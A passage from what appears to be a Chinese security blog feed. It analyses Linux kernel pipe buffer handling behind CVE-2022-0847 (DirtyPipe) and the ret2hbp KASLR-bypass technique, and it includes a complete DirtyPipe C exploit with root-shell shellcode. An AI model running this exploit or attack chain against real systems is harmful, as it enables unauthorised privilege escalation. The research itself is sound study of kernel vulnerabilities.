src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101642057.png"></p><h3 id="第二处"><a href="#第二处" class="headerlink" title="第二处"></a>第二处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to this pipe buffer,</span></span><br><span class="line"><span class="comment"> * so we can copy the contents over.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) {</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">*obuf = *ibuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don't inherit the gift and merge flags, we need to</span></span><br><span class="line"><span class="comment"> * prevent multiple steals of this page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;</span><br><span class="line">obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line"></span><br><span class="line">obuf-&gt;len = len;</span><br><span class="line">ibuf-&gt;offset += len;</span><br><span class="line">ibuf-&gt;len -= len;</span><br><span class="line">o_len = len;</span><br><span class="line">o_head++;</span><br><span class="line">opipe-&gt;head = o_head;</span><br><span class="line">}</span><br><span class="line">ret += o_len;</span><br><span class="line">len -= o_len;</span><br></pre></td></tr></tbody></table></figure><p>还是先从释放等操作分析.这里由于只将ibuf-&gt;page中的部分数据发送了,所以ibuf需要继续持有该page.通过pipe_buf_get增加一次对page的引用,所以不会出现其中一端过早释放页面的情况.再来看读写能力,ibuf端可以继续正常读写(写是通过merge)该页.outbuf端由于清除了PIPE_BUF_FLAG_CAN_MERGE标志,只具有对该page的读能力.</p><p>ibuf端能写,obuf端能读,就有覆盖的风险,然而ibuf和obuf中独立的offset,len字段已经避免了这样的冲突(obuf端只能读红色区域,ibuf端只能写白色区域).<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101710568.png"></p><h3 id="第三处"><a href="#第三处" class="headerlink" title="第三处"></a>第三处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) {</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) {</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br></pre></td></tr></tbody></table></figure><p>首先有通过get_page增加页面引用,释放是安全的.<br>输入侧是file_cache,始终持有对该页面读的能力.<br>obuf侧可以读,但读收到obuf中offset,len字段的限制,安全.<br>但由于未清空PIPE_BUF_FLAG_CAN_MERGE位,obuf同时具有对该页面写的能力.</p><p>再来看读写的冲突.<br>file_cache读的范围是整张page,obuf写的范围是蓝色区域,明显存在冲突.对obuf的merge写能覆盖掉文件缓存.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101712569.png"></p><h1 id="CVE-2022-0847-DirtyPipe"><a href="#CVE-2022-0847-DirtyPipe" class="headerlink" title="CVE-2022-0847 DirtyPipe"></a>CVE-2022-0847 DirtyPipe</h1><p>DirtyPipe便是这个问题导致的.利用这个漏洞可以写入只读文件,如写入/etc/passwd或往suid的程序写入shellcode完成提权.</p><p>下面是一个简易的exp.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = {</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>* argv[])</span></span><br><span class="line">{</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,_IONBF,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"usage: ./exploit [target]"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* targetFile = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> targetFd = open(targetFile,O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(targetFd &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"open targetFile"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> pipeFd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipeFd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将pipe写满再读出,使每一个pipe_buffer带上PIPE_BUF_FLAG_CAN_MERGE标志</span></span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="type">size_t</span> totalSize = <span class="number">16</span>*PAGE_SIZE;</span><br><span class="line">    <span class="type">size_t</span> ret_sz;</span><br><span class="line">    <span class="keyword">while</span> (totalSize)</span><br><span class="line">    {</span><br><span class="line">        ret_sz = write(pipeFd[<span class="number">1</span>],buf,PAGE_SIZE);</span><br><span class="line">        totalSize -= ret_sz;</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    totalSize = <span class="number">16</span>*PAGE_SIZE;</span><br><span class="line">    <span class="keyword">while</span> (totalSize)</span><br><span class="line">    {</span><br><span class="line">        ret_sz = read(pipeFd[<span class="number">0</span>],buf,PAGE_SIZE);</span><br><span class="line">        totalSize -= ret_sz;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">//触发漏洞</span></span><br><span class="line">    <span class="type">int</span> ret = splice(targetFd,<span class="literal">NULL</span>,pipeFd[<span class="number">1</span>],<span class="literal">NULL</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">        err_exit(<span class="string">"splice"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入目标文件</span></span><br><span class="line">    ret = write(pipeFd[<span class="number">1</span>],shellcode+<span class="number">1</span>,<span class="keyword">sizeof</span>(shellcode)<span class="number">-1</span>);</span><br><span class="line">    logd(<span class="string">"write %d"</span>,ret);</span><br><span class="line"></span><br><span class="line">    system(targetFile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2hbp 将任意地址写转为堆栈越界读写</title>
      <link href="/2024/ret2hbp/"/>
      <url>/2024/ret2hbp/</url>
      
        <content type="html"><![CDATA[<p>Bringing back the stack attack…<br>KASLR最后的余晖罢了…</p><span id="more"></span><p>要在任意地址读的情况下Defeate KASLR,很自然的思路是寻找虚拟地址空间中未随机化的空间.(如FG-KASLR的绕过方式).<br>cpu_entry_area mapping固定在0xfffffe0000000000.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405090034524.png"></p><p>关于cpu_entry_area的描述:<br><a href="https://www.kernel.org/doc/html/latest/arch/x86/pti.html?highlight=cpu_entry_area#page-table-isolation-pti">https://www.kernel.org/doc/html/latest/arch/x86/pti.html?highlight=cpu_entry_area#page-table-isolation-pti</a><br>总结一下,为引入KPTI,用户页表中需要保存进入和退出内核所需要的数据,这些数据就映射到一个固定的区域cpu_entry_area.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cpu_entry_area is a percpu region that contains things needed by the CPU</span></span><br><span class="line"><span class="comment"> * and early entry/exit code.  Real types aren't used for all fields here</span></span><br><span class="line"><span class="comment"> * to avoid circular header dependencies.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Every field is a virtual alias of some other allocated backing store.</span></span><br><span class="line"><span class="comment"> * There is no direct allocation of a struct cpu_entry_area.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_entry_area</span> {</span></span><br><span class="line"><span class="type">char</span> gdt[PAGE_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The GDT is just below entry_stack and thus serves (on x86_64) as</span></span><br><span class="line"><span class="comment"> * a read-only guard page. On 32-bit the GDT must be writeable, so</span></span><br><span class="line"><span class="comment"> * it needs an extra guard page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line"><span class="type">char</span> guard_entry_stack[PAGE_SIZE];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">entry_stack_page</span> <span class="title">entry_stack_page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line"><span class="type">char</span> guard_doublefault_stack[PAGE_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">doublefault_stack</span> <span class="title">doublefault_stack</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On x86_64, the TSS is mapped RO.  On x86_32, it's mapped RW because</span></span><br><span class="line"><span class="comment"> * we need task switches to work, and task switches write to the TSS.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Exception stacks used for IST entries with guard pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cea_exception_stacks</span> <span class="title">estacks</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Per CPU debug store for Intel performance monitoring. Wastes a</span></span><br><span class="line"><span class="comment"> * full page at the moment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">debug_store</span> <span class="title">cpu_debug_store</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The actual PEBS/BTS buffers must be mapped to user space</span></span><br><span class="line"><span class="comment"> * Reserve enough fixmap PTEs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">debug_store_buffers</span> <span class="title">cpu_debug_buffers</span>;</span></span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>其中的estacks是Interrupt-Stack的映射.<br>IST机制: <a href="https://www.cs.utexas.edu/~vijay/cs378-f17/projects/AMD64_Architecture_Programmers_Manual.pdf#G14.908888">https://www.cs.utexas.edu/~vijay/cs378-f17/projects/AMD64_Architecture_Programmers_Manual.pdf#G14.908888</a> 及 <a href="https://www.kernel.org/doc/html/latest/arch/x86/kernel-stacks.html">https://www.kernel.org/doc/html/latest/arch/x86/kernel-stacks.html</a></p><blockquote><p>A new feature introduced in the AMD64 extensions is called the Interrupt Stack Table (IST), which also resides in the TSS and contains logical (segment+offset) stack pointers. If an interrupt descriptor table specifies an IST entry to use (there are 7), the processor will load the new stack from the IST instead. This allows known-good stacks to be used in case of serious errors (NMI or Double fault for example). Previously, the entry for the exception or interrupt in the IDT pointed to a task gate, causing the processor to switch to the task that is pointed by the task gate. The original register values were saved in the TSS current at the time the interrupt or exception occurred. The processor then set the registers, including SS:ESP, to a known value specified in the TSS and saved the selector to the previous TSS. The problem here is that hardware task switching is not supported on AMD64.</p></blockquote><p>当某中断的IDT条目中IST序号不为0,则当该中断发生时会从TSS中无条件将栈切换到对应的Interrupt-Stack并进行异常处理.同时向栈中压入pt_regs结构.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Macro to enforce the same ordering and stack sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ESTACKS_MEMBERS(guardsize, optional_stack_size)\</span></span><br><span class="line"><span class="meta">charDF_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charDF_stack[EXCEPTION_STKSZ];\</span></span><br><span class="line"><span class="meta">charNMI_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charNMI_stack[EXCEPTION_STKSZ];\</span></span><br><span class="line"><span class="meta">charDB_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charDB_stack[EXCEPTION_STKSZ];\</span></span><br><span class="line"><span class="meta">charMCE_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charMCE_stack[EXCEPTION_STKSZ];\</span></span><br><span class="line"><span class="meta">charVC_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charVC_stack[optional_stack_size];\</span></span><br><span class="line"><span class="meta">charVC2_stack_guard[guardsize];\</span></span><br><span class="line"><span class="meta">charVC2_stack[optional_stack_size];\</span></span><br><span class="line"><span class="meta">charIST_top_guard[guardsize];\</span></span><br><span class="line"><span class="meta"></span></span><br></pre></td></tr></tbody></table></figure><p>于是类似于早期内核栈中保存的pt_regs作栈迁移的手法,这里也可以直接栈迁移.</p><p>更强大的利用是,当内核触发该类异常时,若改变栈上的pt_regs结构,便可劫持内核.若内核在读一段内存时触发该类中断,攻击者通过漏洞更改rcx寄存器(通常用于循环中的计数),即可造成越界读,同理可以造成越界写.<br>而越界读写,无论是在堆上还是栈上,都是Defeate KASLR的有利手段.</p><p>具体来说,比如uname调用是一个很好的栈上的越界读取.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; kernel/sys.c:1280</span></span><br><span class="line"><span class="comment">/* 1280 */</span> SYSCALL_DEFINE1(newuname, <span class="keyword">struct</span> new_utsname __user *, name)</span><br><span class="line"><span class="comment">/* 1281 */</span> {</span><br><span class="line"><span class="comment">/* 1282 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">new_utsname</span> <span class="title">tmp</span>;</span></span><br><span class="line"><span class="comment">/* 1283 */</span> </span><br><span class="line"><span class="comment">/* 1284 */</span> down_read(&amp;uts_sem);</span><br><span class="line"><span class="comment">/* 1285 */</span> <span class="built_in">memcpy</span>(&amp;tmp, utsname(), <span class="keyword">sizeof</span>(tmp));</span><br><span class="line"><span class="comment">/* 1286 */</span> up_read(&amp;uts_sem);</span><br><span class="line"><span class="comment">/* 1287 */</span> <span class="keyword">if</span> (copy_to_user(name, &amp;tmp, <span class="keyword">sizeof</span>(tmp)))</span><br><span class="line"><span class="comment">/* 1288 */</span> <span class="keyword">return</span> -EFAULT;</span><br></pre></td></tr></tbody></table></figure><p>prctl_set_mm_map是一个很好的栈上的越界写入</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; kernel/sys.c:1955</span></span><br><span class="line"><span class="comment">/* 1955 */</span> <span class="meta">#<span class="keyword">ifdef</span> CONFIG_CHECKPOINT_RESTORE</span></span><br><span class="line"><span class="comment">/* 1956 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">prctl_set_mm_map</span><span class="params">(<span class="type">int</span> opt, <span class="type">const</span> <span class="type">void</span> __user *addr, <span class="type">unsigned</span> <span class="type">long</span> data_size)</span></span><br><span class="line"><span class="comment">/* 1957 */</span> {</span><br><span class="line">    <span class="comment">// 目标栈上临时对象</span></span><br><span class="line"><span class="comment">/* 1958 */</span> <span class="class"><span class="keyword">struct</span> <span class="title">prctl_mm_map</span> <span class="title">prctl_map</span> =</span> { .exe_fd = (u32)<span class="number">-1</span>, };</span><br><span class="line">------</span><br><span class="line">    <span class="comment">// 调用copy_from_user，结合任意地址写原语和硬件断点，做到栈溢出ROP攻击</span></span><br><span class="line"><span class="comment">/* 1973 */</span> <span class="keyword">if</span> (copy_from_user(&amp;prctl_map, addr, <span class="keyword">sizeof</span>(prctl_map)))</span><br><span class="line"><span class="comment">/* 1974 */</span> <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="comment">/* 1975 */</span> </span><br><span class="line">    <span class="comment">// 对prctl_map对象内容进行校验，失败后快速返回触发ROP，不多调用函数</span></span><br><span class="line"><span class="comment">/* 1976 */</span> error = validate_prctl_map_addr(&amp;prctl_map);</span><br><span class="line"><span class="comment">/* 1977 */</span> <span class="keyword">if</span> (error)</span><br><span class="line"><span class="comment">/* 1978 */</span> <span class="keyword">return</span> error;</span><br></pre></td></tr></tbody></table></figure><blockquote><p>总结下攻击流程：<br>    父进程fork出子进程victim<br>    父进程ptrace victim，父进程给victim设置硬件断点<br>    父进程fork出子进程trigger，循环触发任意地址写原语修改DEBUG Exception stack中的cx寄存器值<br>    victim进程循环调用uname syscall，并检查buffer中是否发现stack leak，如果发现就发送给父进程<br>    父进程拿着stack leak编写出ROP代码发送给victim<br>    victim进程循环调用prctl syscall触发目标copy_from_user，直到发生栈溢出ROP提权。</p></blockquote><p>在6.2版本后的内核已经为该区域加上了随机化,并不只是基址随机化,而是每个entry都进行了随机化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __init <span class="type">void</span> <span class="title function_">init_cea_offsets</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_cea;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!kaslr_enabled()) {</span><br><span class="line">for_each_possible_cpu(i)</span><br><span class="line">per_cpu(_cea_offset, i) = i;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">max_cea = (CPU_ENTRY_AREA_MAP_SIZE - PAGE_SIZE) / CPU_ENTRY_AREA_SIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* O(sodding terrible) */</span></span><br><span class="line">for_each_possible_cpu(i) 